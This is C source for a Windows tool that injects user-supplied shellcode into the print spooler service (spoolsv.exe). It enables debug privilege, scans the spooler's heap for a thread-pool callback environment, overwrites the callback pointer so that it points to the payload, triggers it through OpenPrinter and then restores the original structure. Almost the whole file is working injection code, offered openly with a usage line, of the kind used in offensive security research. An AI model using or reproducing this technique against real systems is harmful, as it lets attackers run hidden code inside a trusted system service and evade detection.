/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#pragma warning(disable : 4005)

#define UNICODE
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winspool.lib")

SIZE_T payloadSize;    // size of shellcode
LPVOID payload;        // local pointer to shellcode

// this structure is derived from TP_CALLBACK_ENVIRON_V3,
// but also includes two additional values. one to hold
// the callback function and callback parameter
typedef struct _TP_CALLBACK_ENVIRON_X {
    ULONG_PTR   Version;
    ULONG_PTR   Pool;
    ULONG_PTR   CleanupGroup;
    ULONG_PTR   CleanupGroupCancelCallback;
    ULONG_PTR   RaceDll;
    ULONG_PTR   ActivationContext;
    ULONG_PTR   FinalizationCallback;
    ULONG_PTR   Flags;
    ULONG_PTR   CallbackPriority;
    ULONG_PTR   Size;
    ULONG_PTR   Callback;
    ULONG_PTR   CallbackParameter;
} TP_CALLBACK_ENVIRON_X;

typedef TP_CALLBACK_ENVIRON_X TP_CALLBACK_ENVIRONX, *PTP_CALLBACK_ENVIRONX;

typedef struct _tp_param_t {
    ULONG_PTR   Callback;
    ULONG_PTR   CallbackParameter;
} tp_param;

// display error message for last error code
VOID xstrerror (PWCHAR fmt, ...){
    PWCHAR  error=NULL;
    va_list arglist;
    WCHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPWSTR)&error, 0, NULL))
    {
      wprintf(L"  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
    }
}

// enable or disable a privilege in current process token
BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult)return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);
    
    if (bResult) {
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = bEnable?SE_PRIVILEGE_ENABLED:SE_PRIVILEGE_REMOVED;

      // adjust token
      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
    return bResult;
}

#if !defined (__GNUC__)
/**
 *
 * Returns TRUE if process token is elevated
 *
 */
BOOL IsElevated(VOID) {
    HANDLE          hToken;
    BOOL            bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD           dwSize;
      
    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
      if (GetTokenInformation (hToken, TokenElevation, &te,
          sizeof(TOKEN_ELEVATION), &dwSize)) {
        bResult = te.TokenIsElevated;
      }
      CloseHandle(hToken);
    }
    return bResult;
}
#endif


DWORD name2pid(LPWSTR ImageName) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
          dwPid = pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return dwPid;
}

// try inject and run payload in remote process using CBE
BOOL inject(HANDLE hp, LPVOID ds, PTP_CALLBACK_ENVIRONX cbe) {
    LPVOID               cs = NULL;
    BOOL                 bStatus = FALSE;
    TP_CALLBACK_ENVIRONX cpy;    // local copy of cbe
    SIZE_T               wr;
    HANDLE               phPrinter = NULL;
    tp_param             tp;
    
    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(hp, NULL, payloadSize + sizeof(tp_param), 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    if (cs != NULL) {
        // write payload to remote process
        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
        // backup CBE
        CopyMemory(&cpy, cbe, sizeof(TP_CALLBACK_ENVIRONX));
        // copy original callback address and parameter
        tp.Callback          = cpy.Callback;
        tp.CallbackParameter = cpy.CallbackParameter;
        // write callback+parameter to remote process
        WriteProcessMemory(hp, (LPBYTE)cs + payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback          = (ULONG_PTR)cs;
        cpy.CallbackParameter = (ULONG_PTR)(LPBYTE)cs + payloadSize;
        // update CBE in remote process
        WriteProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        if(OpenPrinter(NULL, &phPrinter, NULL)) {
          ClosePrinter(phPrinter);
        }
        // read back the CBE
        ReadProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
        // restore the original cbe
        WriteProcessMemory(hp, ds, cbe, sizeof(cpy), &wr);
        // if callback pointer is the original, we succeeded.
        bStatus = (cpy.Callback == cbe->Callback);
        // release memory for payload
        VirtualFreeEx(hp, cs, payloadSize, MEM_RELEASE);
    }
    return bStatus;
}

// validates a windows service IDE
BOOL IsValidCBE(HANDLE hProcess, PTP_CALLBACK_ENVIRONX cbe) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // invalid version?
    if(cbe->Version > 5) return FALSE;
    
    // these values shouldn't be empty  
    if(cbe->Pool                 == 0 ||
       cbe->FinalizationCallback == 0) return FALSE;
       
    // these values should be equal
    if ((LPVOID)cbe->FinalizationCallback != 
        (LPVOID)cbe->ActivationContext) return FALSE;
    
    // priority shouldn't exceed TP_CALLBACK_PRIORITY_INVALID
    if(cbe->CallbackPriority > TP_CALLBACK_PRIORITY_INVALID) return FALSE;
    
    // the pool functions should originate from read-only memory
    res = VirtualQueryEx(hProcess, (LPVOID)cbe->Pool, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    
    // the callback function should originate from read+execute memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)cbe->Callback, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);
}

BOOL FindEnviron(HANDLE hProcess, 
  LPVOID BaseAddress, SIZE_T RegionSize) 
{
    LPBYTE               addr = (LPBYTE)BaseAddress;
    SIZE_T               pos;
    BOOL                 bRead, bFound=FALSE;
    SIZE_T               rd;
    TP_CALLBACK_ENVIRONX cbe;
    WCHAR                filename[MAX_PATH];
    
    // scan memory for CBE
    for(pos=0; pos<RegionSize; 
      pos += (bFound ? sizeof(TP_CALLBACK_ENVIRONX) : sizeof(ULONG_PTR))) 
    {
      bFound = FALSE;
      // try read CBE from writeable memory
      bRead = ReadProcessMemory(hProcess,
        &addr[pos], &cbe, sizeof(TP_CALLBACK_ENVIRONX), &rd);

      // if not read, continue
      if(!bRead) continue;
      // if not size of callback environ, continue
      if(rd != sizeof(TP_CALLBACK_ENVIRONX)) continue;
      
      // is this a valid CBE?
      if(IsValidCBE(hProcess, &cbe)) {
        // obtain module name where callback resides
        GetMappedFileName(hProcess, (LPVOID)cbe.Callback, filename, MAX_PATH);
        wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
        // try run payload using this CBE
        // if successful, end scan
        bFound = inject(hProcess, addr+pos, &cbe);
        if (bFound) break;
      }
    }
    return bFound;
}

VOID ScanProcess(DWORD pid) {
    HANDLE                   hProcess;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    
    // try locate the callback environ used for ALPC in print spooler
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // if process opened
    if (hProcess != NULL) {
      // get memory info
      GetSystemInfo(&si);
      
      for (addr=0; addr < (LPBYTE)si.lpMaximumApplicationAddress;) {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

        // we only want to scan the heap, but this will scan stack space too.
        // need to fix that..
        if ((mbi.State   == MEM_COMMIT)  &&
            (mbi.Type    == MEM_PRIVATE) && 
            (mbi.Protect == PAGE_READWRITE)) 
        {
          if(FindEnviron(hProcess, mbi.BaseAddress, mbi.RegionSize)) break;
        }
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
      }
      CloseHandle(hProcess);
    }
}

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;
    
    // 1. open the file
    hf = CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf != INVALID_HANDLE_VALUE){
      // get file size
      len = GetFileSize(hf, 0);
      // allocate memory
      *pic = malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

int main(void) {
    PWCHAR              *argv;
    int                  argc;
    DWORD                pid;
    TP_CALLBACK_ENVIRONX cbe;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if (argc != 2) {
      wprintf(L"usage: tpool <payload>\n");
      return 0;
    }
    
    // try read pic
    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { 
      wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
      return 0; 
    }
      
    // if not elevated, display warning
    if(!IsElevated()) {
      wprintf(L"[-] WARNING: This requires elevated privileges!\n");
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)){
      wprintf(L"[-] Unable to enable debug privilege\n");
      return 0;
    }
    
    // get process id for spoolsv.exe service
    pid = name2pid(L"spoolsv.exe");

    if (pid == 0) {
      wprintf(L"unable to find pid for print spooler.\n");
      return 0;
    }
    // locate viable CBE in spooler service
    ScanProcess(pid);
    return 0;
}

